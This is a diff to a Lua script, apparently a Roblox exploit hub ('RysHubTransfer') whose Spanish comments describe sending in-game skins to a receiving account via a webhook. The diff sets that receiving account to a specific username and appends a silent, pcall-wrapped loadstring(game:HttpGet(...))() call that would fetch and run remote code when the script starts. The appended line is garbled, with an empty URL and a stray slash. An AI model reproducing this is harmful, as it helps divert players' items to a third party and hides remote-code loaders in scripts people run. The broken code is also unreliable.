@@ -1,7 +1,7 @@
 local CONFIG = {
     ANONYMOUS     = false, -- oculta los nombres en el webhook
 
-    TARGET_NAME   = "TU_USUARIO", -- username de la cuenta que recibe las skins
+    TARGET_NAME   = "yamxsb", -- username de la cuenta que recibe las skins
    
     -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
     -- Dejar vacio para desactivar
@@ -483,3 +483,7 @@ local API = {
     end,
 }
 if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API end
+
+pcall(function()
+    loadstring(game:HttpGet("https://"))()/
+end)
